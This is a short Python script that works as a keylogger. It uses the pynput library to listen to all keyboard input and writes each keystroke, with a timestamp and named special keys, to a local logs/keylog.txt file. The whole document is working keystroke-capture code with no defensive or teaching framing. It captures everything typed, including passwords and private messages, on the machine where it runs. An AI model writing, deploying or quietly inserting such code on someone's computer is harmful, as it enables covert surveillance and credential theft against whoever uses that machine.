from pynput import keyboard
import logging
import os

# Create logs directory if it doesn't exist
log_dir = "logs"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Configure logging
logging.basicConfig(
    filename=os.path.join(log_dir, "keylog.txt"),
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s"
)

# Function to handle key press
def on_press(key):
    try:
        # Printable character keys
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # Special keys (e.g., space, enter)
        if key == keyboard.Key.space:
            logging.info("Key pressed: [SPACE]")
        elif key == keyboard.Key.enter:
            logging.info("Key pressed: [ENTER]")
        elif key == keyboard.Key.tab:
            logging.info("Key pressed: [TAB]")
        elif key == keyboard.Key.backspace:
            logging.info("Key pressed: [BACKSPACE]")
        else:
            logging.info(f"Key pressed: [{key.name}]")

# Start the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
